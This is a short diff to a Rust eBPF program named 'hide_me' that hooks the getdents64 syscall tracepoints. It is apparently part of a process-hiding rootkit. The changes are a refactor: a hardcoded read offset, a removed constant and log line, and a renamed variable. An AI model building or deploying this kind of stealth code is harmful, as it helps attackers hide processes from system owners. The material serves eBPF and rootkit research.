@@ -10,7 +10,6 @@ use aya_ebpf::{
     programs::TracePointContext,
 };
 use aya_log_ebpf::info;
-use hide_me_common::RET;
 
 use vmlinux::vmlinux::{linux_dirent64, task_struct};
 
@@ -32,7 +31,7 @@ static target_ppid: HashMap<u8, i32> = HashMap::<u8, i32>::with_max_entries(1, 0
 
 #[tracepoint]
 pub fn hide_me(ctx: TracePointContext) -> u32 {
-    handle_getdents_enter(ctx).unwrap_or_else(|ret| ret)
+    handle_getdents_enter(ctx).unwrap_or_else(|the_ret| the_ret)
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
@@ -88,8 +87,7 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
     // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid();
-    let total_bytes_read: i64 = unsafe { ctx.read_at(RET as usize).unwrap() };
-    info!(&ctx, "RET is {}", RET);
+    let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
     info!(&ctx, "total_bytes_read is {}", total_bytes_read);
     // unsafe {
     //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
